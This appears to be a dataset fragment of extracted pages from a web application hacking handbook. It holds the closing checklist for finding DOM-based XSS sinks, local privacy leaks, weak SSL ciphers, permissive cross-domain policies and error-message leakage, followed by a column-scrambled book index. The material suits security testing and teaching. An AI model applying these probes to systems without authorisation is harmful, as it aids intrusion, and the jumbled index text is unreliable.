    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 850\n850 Chapter 21 n A Web Application Hacker’s Methodology\nand scripts contained within HTML pages (both static and dynamically\ngenerated).\n12.1.2 Identify all uses of the following APIs, which may be used to access\nDOM data that can be controlled via a crafted URL:\ndocument.location\ndocument.URL\ndocument.URLUnencoded\ndocument.referrer\nwindow.location\n12.1.3 Trace the relevant data through the code to identify what actions are\nperformed with it. If the data (or a manipulated form of it) is passed to\none of the following APIs, the application may be vulnerable to XSS:\ndocument.write()\ndocument.writeln()\ndocument.body.innerHtml\neval()\nwindow.execScript()\nwindow.setInterval()\nwindow.setTimeout()\n12.1.4 If the data is passed to one of the following APIs, the application may\nbe vulnerable to a redirection attack:\ndocument.location\ndocument.URL\ndocument.open()\nwindow.location.href\nwindow.navigate()\nwindow.open()\n12.2 Check for Local Privacy Vulnerabilities\n12.2.1 Review the logs created by your intercepting proxy to identify all the\nSet-Cookie directives received from the application during your test-\ning. If any of these contains an expires attribute with a date that is in\nthe future, the cookie will be stored by users’ browsers until that date.\nReview the contents of any persistent cookies for sensitive data.\n12.2.2 If a persistent cookie is set that contains any sensitive data, a local attacker\nmay be able to capture this data. Even if the data is encrypted, an attacker\nwho captures it will be able to resubmit the cookie to the application\nand gain access to any data or functionality that this allows.\n12.2.3 If any application pages containing sensitive data are accessed over\nHTTP, look for any cache directives within the server’s responses. If any\nof the following directives do not exist (either within the HTTP headers\ncc2211..iinndddd 885500 88//1199//22001111 1122::2222::0066 PPMM"
  },
  {
    "input": "12.4 Check Same-Origin Policy Configuration",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 851\nChapter 21 n A Web Application Hacker’s Methodology 851\nor within HTML metatags), the page concerned may be cached by one\nor more browsers:\nExpires: 0\nCache-control: no-cache\nPragma: no-cache\n12.2.4 Identify any instances within the application in which sensitive data is\ntransmitted via a URL parameter. If any cases exist, examine the browser\nhistory to verify that this data has been stored there.\n12.2.5 For all forms that are used to capture sensitive data from the user (such\nas credit card details), review the form’s HTML source. If the attribute\nautocomplete=off is not set, within either the form tag or the tag for the\nindividual input fi eld, data entered is stored within browsers that sup-\nport autocomplete, provided that the user has not disabled this feature.\n12.2.6 Check for technology-specifi c local storage.\n12.2.6.1 Check for Flash local objects using the BetterPrivacy plug-in\nfor Firefox.\n12.2.6.2 Check any Silverlight isolated storage in this directory:\nC:\\Users\\{username}\\AppData\\LocalLow\\Microsoft\\\nSilverlight\\\n12.2.6.3 Check any use of HTML5 local storage.\n12.3 Check for Weak SSL Ciphers\n12.3.1 If the application uses SSL for any of its communications, use the tool\nTHCSSLCheck to list the ciphers and protocols supported.\n12.3.2 If any weak or obsolete ciphers and protocols are supported, a suitably\npositioned attacker may be able to perform an attack to downgrade or\ndecipher the SSL communications of an application user, gaining access\nto his sensitive data.\n12.3.3 Some web servers advertise certain weak ciphers and protocols as sup-\nported but refuse to actually complete a handshake using these if a\nclient requests them. This can lead to false positives when you use the\nTHCSSLCheck tool. You can use the Opera browser to attempt to per-\nform a complete handshake using specifi ed weak protocols to confi rm\nwhether these can actually be used to access the application.\n12.4 Check Same-Origin Policy Confi guration\n12.4.1 Check for the /crossdomain.xml fi le. If the application allows unrestricted\naccess (by specifying <allow-access-from domain=”*” />), Flash objects\ncc2211..iinndddd 885511 88//1199//22001111 1122::2222::0066 PPMM"
  },
  {
    "input": "13 Follow Up Any Information Leakage",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 852\n852 Chapter 21 n A Web Application Hacker’s Methodology\nfrom any other site can perform two-way interaction, riding on the ses-\nsions of application users. This would allow all data to be retrieved, and\nany user actions to be performed, by any other domain.\n12.4.2 Check for the /clientaccesspolicy.xml fi le. Similar to Flash, if the\n<cross-domain-access> confi guration is too permissive, other sites\ncan perform two-way interaction with the site under assessment.\n12.4.3 Test an application’s handling of cross-domain requests using\nXMLHttpRequest by adding an Origin header specifying a different\ndomain and examining any Access-Control headers that are returned.\nThe security implications of allowing two-way access from any domain,\nor from specifi ed other domains, are the same as those described for the\nFlash cross-domain policy.\n13 Follow Up Any Information Leakage\n13.1 In all your probing of the target application, monitor its responses for\nerror messages that may contain useful information about the error’s\ncause, the technologies in use, and the application’s internal structure\nand functionality.\n13.2 If you receive any unusual error messages, investigate these using stan-\ndard search engines. You can use various advanced search features to\nnarrow down your results. For example:\n“unable to retrieve” filetype:php\n13.3 Review the search results, looking both for any discussion about the\nerror message and for any other websites in which the same message has\nappeared. Other applications may produce the same message in a more\nverbose context, enabling you to better understand what kind of conditions\ngive rise to the error. Use the search engine cache to retrieve examples\nof error messages that no longer appear within the live application.\n13.4 Use Google code search to locate any publicly available code that may\nbe responsible for a particular error message. Search for snippets of error\nmessages that may be hard-coded into the application’s source code.\nYou can also use various advanced search features to specify the code\nlanguage and other details, if these are known. For example:\nunable\\ to\\ retrieve lang:php package:mail\n13.5 If you receive error messages with stack traces containing the names\nof library and third-party code components, search for these names on\nboth types of search engine.\ncc2211..iinndddd 885522 88//1199//22001111 1122::2222::0066 PPMM"
  },
  {
    "input": "Index",
    "output": "Stuttard bindex.indd V1 - 08/13/2011 Page 853\nIndex\nA customer, 665–666 platforms, 264–265\nAbsinthe, 322 trust relationships in tiered programmatic, 282\nabsolute URLs, open redirection architecture, 649 referer-based, 266\nvulnerabilities access controls role-based, 282\nblocking, 544–545 account testing, 267–270 security, 278–283\nprefi x, 545–546 API methods, 276–277 best practices, 279–280\n“accept known good” approach, HTTP methods, 278 central component approach,\ninput, 24 limited access, 273–276 280\naccess multistage function, 271–273 multilayered privilege\nASP attackers, 658–660 static resources, 277 model, 280–283\nASP.NET API methods application mapping, 268–269 pitfalls, 278–279\ndatabase, 721 attackers, 266–278 static resources, 263–264\nfi le, 720 types, 258–260 account testing, 277\nASPs and customer, 665–666 usernames and passwords, unprotected functionality, API\ndatabase 275–276 methods, 260–261\nASP.NET API methods, 721 back-end components, 357 vertical, 258\nJava API methods, 714–715 broken, 7, 274 vulnerabilities, 258–266, 276\nPerl language API methods, context-dependent, 258 application logic fl aws, 411\n737–738 declarative, 282–283 Access-Control-Allow-\nPHP API methods, 729–730 defective, 257 Origin headers, 528–529\ndefense mechanisms handling, discretionary, 282 account activation URLs, 184\n18–21 fl aws, 284 account suspension, 197–198\nauthentication, 18–19 hacker’s methodology account testing, access controls,\ncontrol, 20–21 insecure access, 823 267–270\nsession management, 19–20 limited access, 822–823 API methods, 276–277\nJava API methods multiple accounts, 822 HTTP methods, 278\ndatabase, 714–715 requirements, 821 limited access, 273–276\nfi le, 713 horizontal, 258 multistage function, 271–273\nPerl language API methods identifi er-based functions, static resources, 277\ndatabase, 737–738 261–262 Achilles proxy, 751\nfi le, 737 insecure methods, 265–266 Action Message Format (AMF),\nPHP API methods location-based, 266 135\ndatabase, 729–730 multistage functions, 262–263 Burp Suite, 137\nfi le, 727–729 testing, 271–273 active scanning, 764–765\nshared hosting parameter-based, 265–266 ActiveX controls, 447\nattackers, 658–660 per-user segregation, 274 COMRaider, 558\n853\nbbiinnddeexx..iinndddd 885533 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 854\n854 Index n A–A\nhacker’s methodology, browser Java hacker’s methodology\nextensions, 804 database access, 714–715 attack surface, 842\nHTML modifi cation, 557 dynamic code execution, 715 incomplete input, 843\n“safe for scripting” fi le access, 713 multistage functions,\nregistration, 555–557 OS command execution, 842–843\nvulnerabilities, 555–556 715–716 transaction logic, 844\nfi nding, 556–558 potentially dangerous, trust relationships, 844\npreventing, 558–559 713–716 hacker’s methodology,\nadministrative functions, web sockets, 716 authentication, 811–813\napplications, 35–36 URL redirection, 716 invalidating input validation,\nadministrators Java user input, 712 420–422\nDBA, 325–326 JavaScript DOM-based, 740 lessons, 428–429\ndefense mechanisms handling Perl language login function, 426–427\nattackers, alerting, 33–34 database access, 737–738 race conditions, 427\nAjax dynamic code execution, 738 nature of, 406\nHTML5, 487 fi le access, 737 password change function,\nstored XSS in uploaded fi les OS command execution, 738 409–410\nvia, 486–487 potentially dangerous, proceeding to checkout,\nweb functionality, 62–63, 384 736–739 410–411\nAlcon, Wade, 565 sockets, 739 real-world, 406–407\nalerts, 33–34 URL redirection, 738 rolling your own insurance,\nAllaire JRun, 690–691 PHP 412–413\nallow_url_include, 729 database access, 729–730 search function, 429\nAMF. See Action Message dynamic code execution, abuse, 422–424\nFormat 730–731 security, 428\nampersand character, batch fi le access, 727–729 session management, 429\nfunction, 360–361, 363 OS command execution, 731 shell metacharacters, 419\nAnley, Chris, 218, 322, 634 potentially dangerous, source code, 428\nanomalous event alerts, 33 727–732 SQL injection, 420–422\nanti-CSRF tokens, 508–509, sockets, 732 application logs, 262\n516–517 URL redirection, 731–732 application mapping, 73\nXSS defeating, 509–510 server-side redirection, 392 access controls, 268–269\nanti-XSS fi lters, 452 SQL injection, 291 analyzing, 97–113\nIE, 748 versatility, 358 key areas, 97–98\nAOL AIM Enterprise Gateway Apple iDisk Server, path attack surface, 111\napplication, 409 traversal vulnerabilities, 690 example, 112–113\nApache application. See web application Burp Suite, 268\nchunked encoding overfl ow, application architecture. See comparisons, 268–269\n688 tiered architectures enumerating content and\nerror messages, 628 application logic fl aws functionality, 74–97\nmod_isapi, 688 access controls vulnerabilities, hacker’s methodology, 795–798\nmod_proxy, 688 411 debug parameters, 798\nrefl ected XSS, 442 attack surface, 405 default content, 797\nTomcat, 673 audit trail, 429 enumerating identifi ers,\nvirtual hosting, 683 authentication, 415–416 797–798\nAPI methods avoiding, 428–429 hidden content, 796–797\naccess controls to, 260–261 beating business limit, 416–417, public information resources,\naccount testing, 276–277 429 796\nASP.NET breaking bank, 414–416 tokens to sessions, 818\ndatabase, 721 bulk discount cheating, 418, 429 visible content, 795–796\ndynamic code execution, 722 debugger messages, 424–426 hidden content\nfi le access, 720 developers, 429–430 brute-force techniques\nOS command execution, encryption oracle, 407–408 discovering, 81–85\n722–723 “remember me” function, 407 discovering, 80–93\nsockets, 723 escaping, 419–420 inference from published\nURL redirection, 723 fi nancial services, 412–416 content discovering,\nuser input, 718–719 forced browsing, 411 85–89\nbbiinnddeexx..iinndddd 885544 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 855\nIndex n A–A 855\npublic information dynamic code execution, 722 browser extensions casino\ndiscovering, 89–91 fi le access, 720 component, 134\nweb server leveraged for OS command execution, CAPTCHA, 198–199\ndiscovering, 91–93 722–723 customized automation,\nhidden parameters, 96–97 sockets, 723 610–611\ninput entry points URL redirection, 723 client-side attacks, 13\nHTTP headers, 100–101 user input, 718–719 cloud computing, 14, 663–665\nout-of-band channels, 101 error messages, 628 cloned systems, 664\nrequest parameters, 99 OS command injection via, tokens, 665\nURL fi le paths, 98–99 360–361 cookie injection methods,\nmethodology, 114 redirection, 392 536–537\nnaming schemes, 85–86 security confi guration, 723–724 credentials, 171\nbrute-force exercise, 88 session interaction, 719–720 defense mechanisms handling,\nidentifying, 87 stack traces, 617 30–35\npath traversal vulnerabilities, ViewState administrator alerting, 33–34\n371 attackers, 127 audit log maintenance, 31–32\nserver-side Base64 encoding, 125–126 errors, 30–31\nfunctionality identifi cation, Burp Suite, 126 reacting to, 34–35\n106–110 client-side data transmission, disabled elements, 132–133\ntechnology identifi cation, 124–127 encoding and, 66–67\n101–106 purpose, 125 forgotten password, 14\nweb application pages versus security, 155 format string vulnerabilities,\nfunctional paths, 93–96 ASPs. See application service 644\napplication servers. See web providers HTTP header injection,\nservers .aspx fi le extension, 107 534–535\napplication service providers Astely, Rick, 541 intentions, 13\n(ASPs), 656–657. Seealso ASP. attack payloads, XSS, 443–447 login function, 164–165\nNET; cloud computing autocomplete, 446 MS-SQL databases, 326–327\nattackers, 658–665 escalating client-side, 447 multilayered privilege model,\naccess, 658–660 escalation to other pages, 283\ndeliberate backdoor scripts, 473–474 multistage login function, 188\n660–661 inducing actions, 445–446 MySQL, 328\nbetween web applications, Trojan injection, 444–445 network hosts, 561–562\n660–663 trust relationship exploitation, non-HTTP services, 562–563\nfi nancial services, 658 446–447 NULL bytes, 23–24\norganization, 658 virtual defacement, 443–444 opaque data, 124\nsecuring, 665–667 attack surface Oracle databases, 327\ncomponent segregation, 667 application logic fl aws, 405 other users, 431–432\ncustomer access, 665–666 application mapping, 111 path traversal vulnerabilities\ncustomer functionality example, 112–113 circumventing obstacles,\nsegregation, 666 hacker’s methodology, 374–377\nshared, 657–658 application logic fl aws, successful, 374\nthreats, 657 842 target locations, 370–371\nVPN, 659 hacker’s methodology remote, 427\narbitrary input. See user input mapping, 800 session management, 20\narchitecture. See tiered attackers. Seealsospecifi cattacks session token scripts, 217\narchitectures access controls, 266–278 shared hosting, 658–665\nArmstrong, Dave, 505 types, 258–260 access, 658–660\nTheArtofSoftwareSecurity usernames and passwords, deliberate backdoor scripts,\nAssessment (Dowd & 275–276 660–661\nMcDonald & Schuh), 634 ASP.NET ViewState, 127 between web applications,\nASCII code, 67 ASPs, 658–665 660–663\nUS-ASCII, 464 access, 658–660 stored XSS steps, 438–439\nAsirra puzzles, Microsoft, 612 deliberate backdoor scripts, tiered architectures, 648–654\nASP.NET, 54, 103 660–661 categories, 648–649\nAPI methods between web applications, tokens\ndatabase, 721 660–663 encrypting, 232–233\nbbiinnddeexx..iinndddd 885555 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 856\n856 Index n B–B\nmeaningful, 212 insecure web storage, 811 nonunique, 181–182\nURL translation, 396–397 password guessing, 807 predictable, 182–183, 197\nusername, 168 password quality, 806 uniqueness, 809\nweb application security, 6 password recovery, 807–808 XSS, 473–474\nweb browsers, 559–568 “remember me” functions, autocomplete\nwebsites created by, 448–449 808 local privacy attacks, 552\nXMLHttpRequest, 529 understanding, 805 XSS attack payloads, 446\nXSS, 251 username enumeration, automation. See customized\nattribute delimiters, HTML 806–807 automation\nbypassing fi lters, 461–462 username uniqueness, 809\nattribute names, HTML vulnerability exploitation for\nB\nbypassing fi lters, 461 unauthorized access,\nbackdoor password, 178–179\nattribute values, HTML 813\nsource code, 708\nbypassing fi lters, 462 HTML forms, 160–161\nbackdoor scripts, deliberate,\naudit logs HTTP, 50–51\n660–661\ndefense mechanisms handling sessions avoided with,\nback-end components. Seealso\nattackers, maintaining, 208–209\nfi le inclusion; operating\n31–32 impersonation, 178–180\nsystem commands; path\nkey events, 32 hacker’s methodology,\ntraversal vulnerabilities\npoorly protected, 32 808–809\nvalue, 31 implementation fl aws in, access controls, 357\naudit trail, 429 185–191 data transmission, 357\nauthentication. Seealso information leakage e-mail header injection,\naccess controls; session prevention, 195–196 398–399\nmanagement logging, 201 HPI, 390\nanomalies, 201 login function causes, 393–394\napplication logic fl aws, 415–416 account suspension, 197–198 HPP, 394–395\nbroken, 7 fail-open, 185–186, 194 server-side HTTP redirection,\nbrute-force login function, multistage, 186–190, 194–195 390–392\n162–165 verbose failure messages, exploiting, 391–392\nCAPTCHA, 198–199 166–169 SMTP injection, 397–402\ncredentials monitoring, 201 fl aws, 400–401\nincomplete validation, notifying, 201 preventing, 402\n180–181 passwords SOAP injection, 386–388\ninsecure distribution, 184 change functionality, 171– banking application, 387–388\ninsecure storage, 190–191 172, 193 error messages, 388\nsecret handling of, 192–193 change functionality misuse, fi nding and exploiting, 389\nstrength, 192 199 preventing, 27, 390\ntransmission vulnerability, forgotten functionality, URL translation attacks,\n169–171 173–175 396–397\nvalidation, 193–195 predictable initial, 183 back-end request injection, 841\nCSRF, 507–508 weak, 161–162 backslash character, escaping\nas defense, 159 problems with, 19 with, 419\ndefense mechanisms handling “remember me” functions, backtick character, encapsulating\naccess with, 18–19 175–176, 193 function of, 363\ndesign fl aws, 161–184 hacker’s methodology, 808 banking application\ndrop-down menus, 193 security, 191–201 multistage function, 263\neavesdroppers, 169 brute-force attack prevention, per-page tokens, 252–253\nhacker’s methodology 196–199 SOAP injection, 387–388\napplication logic fl aws, subtleties, 195 banner grabbing, 101\n811–813 smartcards, 206 Base64 encoding, 69\ncredentials, autogenerated, standalone vulnerability ASP.NET ViewState, 125–126\n809–810 scanners, 778–779 basic authentication, 50–51\ncredentials, unsafe technologies, 160–161 batch queries, MS-SQL\ndistribution, 810–811 tokens, 160 databases, 317\ncredentials, unsafe usernames beating business limit,\ntransmission, 810 enumeration, 166–169, application logic fl aws,\nimpersonation, 808–809 806–807 416–417, 429\nbbiinnddeexx..iinndddd 885566 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 857\nIndex n C–C 857\nBeEF, 565–566 hidden content, 81–85 session-handling rules,\nbit fl ipper, Burp Intruder, 593 login function, 162–165 606–609\nencrypting tokens, 228–231 passwords in wiki, 424 session-handling tracer, 609\nblack-box code review, 702–703 buffer overfl ow business limit, application logic\nblacklist-based fi lters, 23–24 detecting, 639–640 fl aws, 416–417, 429\nXSS, 451–452 hacker’s methodology, 837–838 business logic exploitation, 259\nblind SQL injection, 626 heap overfl ows, 635–636 bytecode\nblocked characters, fi lters, off-by-one vulnerabilities, decompiling browser\n311–312 636–638 extensions, 139–141\nblog applications, input, 22 software, 687 JavaScript manipulation, 144\nBoolean conditions, UNION source code, 709 obfuscation, 144–146\noperator, 329 stack overfl ows, 634–635 downloading, 140\nBoolean fl ag, 107 uncontrolled, 639 Flash, 141\nboundary validation, input, URL length, 639 Java, 141\n25–28, 313 bulk discount cheating, Silverlight, 141\nbreaking bank, application logic application logic fl aws, 418, source code recompiling\nfl aws, 414–416 429 within browser, 142–143\nbrowser extensions. Seealso Burp Intruder, 82–84, 86 outside browser, 143\nFlash; Java; Silverlight bit fl ipper, 593 URL, 140\ncasino component, 133–134 encrypting tokens, 228–231\nattackers, 134 “character frobber,” 593\nC\nChrome, 750 customized automation,\nclient-side control of user input 590–602 CA certifi cate, Burp Suite,\nwith, 133–153 data harvesting, 598–600 758–759\ndata transmission interception, enumerating identifi ers, callbacks, function, 520\n135–139 594–597 canonicalization\nobstacles, 138–139 fuzzing, 600–602 input, 28–29\nserialized data, 136–138 payloads web server software, 689–694\ndebugger attached to, 151–152 choosing, 592–594 CAPTCHA\ndecompiling, 139–150 positioning, 591–592 attackers, 198–199\nbytecode, 139–141 predictable tokens, 213–214 customized automation,\nbytecode obfuscation, response analysis, 594 610–611\n144–146 sniper attack, 592 authentication, 198–199\nJava applets example, 146–150 Unicode encoding, 375 bugs, 610–611\nJavaScript manipulating user agent strings, 100 customized automation,\noriginal bytecode, 144 Burp Proxy, 754–755 610–612\nsource code, 142–144 Burp Repeater, 473, 681, 766 attackers, 610–611\nFirefox, 750 Burp Scanner, 764–765 automatically solving,\nhacker’s methodology, 802–804 Burp Sequencer, 767 611–612\nActiveX controls, 804 auto analyze setting, 223 humans solving, 612\ndebugger, 803–804 token randomness testing, drones, 612\ndecompiling, 802–803 219–221 Cascading Style Sheets (CSS)\nnative client components, 153 Burp Spider, 74–76, 80 dynamically evaluated styles,\nsame-origin policy, 525–527 Burp Suite 459\nFlash, 525–526 AMF, 137 font-family property,\nJava, 527 application mapping, 268 518–519\nSilverlight, 526–527 ASP.NET ViewState, 126 injection, cross-domain data\ntargeting approaches, 135 CA certifi cate, 758–759 capture, 517–519\ntechnologies, 65 “change request method” web functionality, 60–61\nbrowsers. See web browsers command, 474–475 casino component, browser\nbrowsing history Comparer, 167 extensions, 133–134\nJavaScript stealing, 560 Content Discovery, 88–89 attackers, 134\nlocal privacy attacks, 552 DSer, 136–137 CBC.See cipher block chaining\nbrute-force techniques “request in browser,” 272–273 CGI query, 735–736\napplication mapping naming session-handling mechanisms, chaining\nschemes exercise, 88 603–609 CBC\nauthentication security cookie jar, 603–604 encrypting tokens, 227–233\npreventing, 196–199 request macros, 604–606 PKC # 5 padding, 227–233\nbbiinnddeexx..iinndddd 885577 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 858\n858 Index n C–C\nXSS, 450–451 validation myths, 155–156 discovering, 80–93\n“change request method” web functionality, 57–65 hacker’s methodology,\ncommand, 474–475 Ajax, 62–63, 384 application mapping,\n“character frobber,” Burp browser extension 796–797\nIntruder, 593 technologies, 65 inference from published\nchecked exceptions, 30 CSS, 60–61 content discovering,\ncheckout, application logic fl aws, DOM, 62 85–89\n410–411 forms, 58–60 Nikto discovering, 93\nCheckQuantity applet, 141 HTML, 58 public information\nChrome, 750 HTML5, 64–65 discovering, 89–91\nchrooted fi le system hyperlinks, 58 user-directed spidering\npath traversal vulnerabilities, JavaScript, 61 discovering, 81–83\n380–381 JSON, 63 web server leveraged for\nUNIX, 381 same-origin policy, 64 discovering, 91–93\ncipher block chaining (CBC) VBScript, 61 Wikto discovering, 92–93\nencrypting tokens, 227–233 XSS attack payloads escalating, web server and default, 92,\nPKC # 5 padding, 686–687 447 671–677\nciphertext, 224–226 cloned systems, 664 debug functionality, 671–672\n.class fi les, 141 cloud computing hacker’s methodology, 847\nClearedFunds element, attackers, 14, 663–665 JMX, 674–676\n387–388 cloned systems, 664 powerful functions, 673–674\ncleartext, passwords, 190–191 tokens, 665 sample functionality, 672–673\nclickjacking, 511. Seealso user defense mechanism, 664 Content Discovery, Burp Suite,\ninterface redress attacks feature-fi rst approach, 664–665 88–89\nclient components, native, 153 loss of control in, 663–664 content management system\nclient-side management tool migration (CMS), 77\nattacks, 13 to, 664 web servers, 92\ndata transmission, 118–127 web applications, 5 Content-Length header, 42\nASP.NET ViewState, web storage, 665 POST request, 581\n124–127 CMS. See content management Content-Type header, 136, 138,\nfor developers, 118 system 476, 478, 525–526\nhacker’s methodology, 801 code browsing tools, 743 context-dependent, access\nhidden HTML forms, 118–120 code injection, 288 controls, 258\nHTTP cookies, 121 code review. See source code, Cookie header, 41, 47\nopaque data, 123–124 review cookie injection\nReferrer header, 122 commands. See operating system attacker methods, 536–537\nsecurity, 154–156 commands session fi xation, 537–540\nURL parameters, 121–122 comments cookie jar, Burp Suite, 603–604\nhacker’s methodology, data MySQL, 303–304, 312 cookies\ntransmission, 801 source code, 710–711 arbitrary, 537\nHPP, 548–550 SQL, 312 attributes, 47\ninformation disclosure leaks, Comparer, Burp Suite, 167 domain restrictions, 245–247\n629 compiled applications. See native hacker’s methodology, 820–821\ninjection, 531–550 client components HTTP, 19, 47\nSQL, 547–548 concealed sequences, 213–215 client-side data transmission,\nJavaScript, validation with, concurrent logins, 250 121\n130–131, 156 conditional errors, SQL injection, session management tokens,\nsecurity, 431–432 320–322 207–208, 234–236\nsession token hijacking, conjunctive queries fi lters, 350 HTTP header injection, 533\n243–244 LDAP injection, 352–353 login function, 163\nSQL injection, 547–548 CONNECT method, 682, 755 path restrictions, 247–248\nSSL certifi cation, 138 content persistent, 550\nuser input controlled by, 117 enumerating and functionality, refl ected XSS, 437–438\nbrowser extensions, 133–153 74–97 RemembeMe, 407–408\nhacker’s methodology, hidden “remember me” functions,\n801–802 brute-force techniques 175–176\nHTML forms, 127–133 discovering, 81–85 ScreenName, 407–408\nbbiinnddeexx..iinndddd 885588 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 859\nIndex n C–C 859\nsession management, liberal escalation to other pages, cookies, 437–438\nscope, 244–248 473–474 defensive fi lters, 455–456\nXSS exploiting via, 475 inducing actions, 445–446 delivering, 448–449\nCOPY method, 679 Trojan injection, 444–445 DOM XSS converted from,\ncount() function, 348 trust relationship 472–473\ncredentials exploitation, 446–447 exploiting, 435–438, 474\nattackers, 171 virtual defacement, 443–444 fi nding and exploiting,\nauthentication vulnerability, attackers, 251 452–481\n169–171 authentication, 473–474 hacker’s methodology,\ne-mail containing, 184 chaining, 450–451 829–830\nhacker’s methodology, CSRF defeating anti-CSRF HTML limitations, 495–496\nauthentication tokens with, 510–511 IE, 435\nautogenerated, 809–810 database error messages, 620 input insertion, 495\nunsafe distribution, 810–811 defense, 28 input validation, 492–493\nunsafe transmission, 810 delivery mechanisms, 447–451 length limits, 471–473\nincomplete validation, 180–181 in-band, 449–450 output validation, 493–495\ninsecure distribution, 184 out-of-band, 450 preventing, 492–496\ninsecure storage, 190–191 DOM-based, 440–442 “remember me” function, 437\nsecret handling of, 192–193 delivering, 448–449 sanitizing fi lters, 468–471\nstrength, 192 fi nding and exploiting, signature-based fi lters,\nvalidation, 193–195 487–491 455–456\nweb server and default, input validation, 497 steps, 436–437\n670–671 output validation, 497–498 stored XSS compared to,\nhacker’s methodology, 846 preventing, 496–498 439–440\ncross-domain data capture, refl ected XSS converted into, user input testing, 453\n515–516 472–473 user input testing to\nCSS injection, 517–519 steps, 441 introduce script,\nFirefox, 521 escaping, 420 454–455\nHTML injection, 516–517 exploits security evolution, 433\nJavaScript hijacking, 519–520 cookies, 475 session token vulnerabilities,\nE4X, 523–524 delivering, 473–481 243–244\nfunction callbacks, 520 JavaScript executed within source code, 704–705\nJSON, 521 XML responses, stored, 438–440\npreventing, 524 478–479 attacker steps, 438–439\nvariable assignment, 522 nonstandard request and delivering, 449–450\nproxy services, 529–531 response content, e-mail testing, 483–484\ncross-domain requests 476–479 fi nding and exploiting,\nJSON, 477 Referrer header, 475–476 481–487\nXMLHttpRequest, 528–529 XML requests sent cross- HTML limitations, 495–496\nXSS sending XML, 477–478 domain, 477–478 input insertion, 495\n/crossdomain.xml, 525–526 fi lters input validation, 492–493\ncross-site request forgery (CSRF), anti-, 452, 748 MySpace, 442–443, 446\n8, 244, 504–511 blacklist-based, 451–452 output validation, 493–495\nanti-CSRF tokens, 508–509, IE, 479–481 preventing, 492–496\n516–517 web browsers, 479–481 refl ected XSS compared to,\nXSS defeating, 510–511 HTML tag pairs, 422 439–440\nauthentication, 507–508 IE fi lter, 479–481 search function, 439\nfl aws JavaScript, 436–438 uploaded fi les testing,\nexploiting, 506–507 non-HTTP services, 562–563 484–487\npreventing, 508–510 NULL bytes, 460 vulnerabilities\nreal-world, 505 POST request changed to GET identifying, 451–452\nhacker’s methodology, 820 request, 474–475 low-risk, 451\nsession management, 251 prevalence, 432 varieties, 433–442\ncross-site scripting (XSS), 8 preventing, 492–498 XSS Shell, 566\nattack payloads, 443–447 real-world, 442–443 cryptographic algorithms, 687\nautocomplete, 446 refl ected, 434–438 CSRF. See cross-site request\nescalating client-side, 447 Apache, 442 forgery\nbbiinnddeexx..iinndddd 885599 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 860\n860 Index n D–D\nCSS. See Cascading Style Sheets data harvesting, 572 information_schema,\nCurl, 788 basic approach, 584–586 309–310\ncustom development, web Burp Intruder, 598–600 MS-SQL\napplications, 10 causes, 583–584 attackers, 326–327\ncustom encoding, path traversal JAttack, 585–586 automated exploitation, 330\nvulnerabilities, 377–378 uses, 584 batch queries, 317\ncustomized automation data stores. Seealso Extensible default lockdown, 326–327\nbarriers to, 602–612 Markup Language; error messages, 334–338\nBurp Intruder, 590–602 Lightweight Directory out-of-band channels, 317\ndata harvesting attack, Access Protocol; Structured syntax, 332–334\n598–600 Query Language WAITFOR command, 322–323\nenumerating identifi ers accessing, 288–289 Oracle\nattack, 594–597 NoSQL, 342–343 attackers, 327\nfuzzing attack, 600–602 privilege level, 287 11g, 318\nCAPTCHA puzzles, 610–612 web applications relying on, error messages, 334–338\nattackers, 610–611 287 out-of-band channels,\nautomatically solving, data transmission. Seealso user 317–318\n611–612 input syntax, 332–334\nhumans solving, 612 back-end components, 357 time delays, 323–324\ndata harvesting, 572 browser extensions UNION operator, 307–308\nbasic approach, 584–586 intercepting, 135–139 searchable and sortable,\nBurp Intruder, 598–600 obstacles, 138–139 321–322\ncauses, 583–584 serialized data, 136–138 stored procedures, 339\nJAttack, 585–586 client-side, 118–127 Davtest, 680\nuses, 584 ASP.NET ViewState, DBA. See database administrator\neffi ciency, 571 124–127 debuggers\nenumerating identifi ers, for developers, 118 browser extensions attaching,\n572–583 hacker’s methodology, 801 151–152\nbasic approach, 574 hidden HTML forms, 118–120 error messages, 425–426,\nBurp Intruder, 594–597 HTTP cookies, 121 618–619\ndetecting hits, 574–576 opaque data, 123–124 common, 619\nexamples, 573 Referrer header, 122 hacker’s methodology,\nHTTP status code, 574 security, 154–156 application mapping, 798\nJAttack, 577–583 URL parameters, 121–122 hacker’s methodology, browser\nLocation header, 575 lazy load approach, 626 extensions, 803–804\nresponse body, 575 opaque, 123–124 Java, 151–152\nresponse length, 574–575 attackers, 124 messages\nscripting, 576–577 database administrator (DBA), application logic fl aws,\nSet-Cookie header, 575 325–326 424–426\ntime delays, 575–576 TheDatabaseHacker’sHandbook, verbose, 425\nfuzzing, 572–573 326 Silverlight, 152\nBurp Intruder, 600–602 databases web server, 671–672\nJAttack, 588–590 access declarative access controls,\nASP.NET API methods, 721 282–283\nobjective, 586–587\nJava API methods, 714–715 decompiling\nstrings, 587\nPerl language API methods, browser extensions, 139–150\nsession-handling mechanisms,\n737–738 bytecode, 139–141\n602–609\ncode components bytecode obfuscation,\nstandalone vulnerability\ndangerous, 742 144–146\nscanners, 780–781\nSQL injection, 741–742 Java applets example, 146–150\nuses, 572–573\nerror messages, 619–622 JavaScript manipulating\nCygwin environment, 577\nencryption oracle, 620–622 original bytecode, 144\ninformation disclosure, source code, 142–144\nD 619–620 hacker’s methodology, browser\nDAC. See discretionary access XSS in, 620 extensions, 802–803\ncontrol escalation attacks, Jad, Java, 148–150\ndata capture. See cross-domain 319, 325–328 decryption algorithms, 650\ndata capture fi ngerprinting, 303–304 default content\nbbiinnddeexx..iinndddd 886600 88//1199//22001111 1122::0011::3355 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 861\nIndex n E–E 861\nhacker’s methodology, document object model (DOM), ECMAScript for XML (E4X), 463\napplication mapping, 797 61 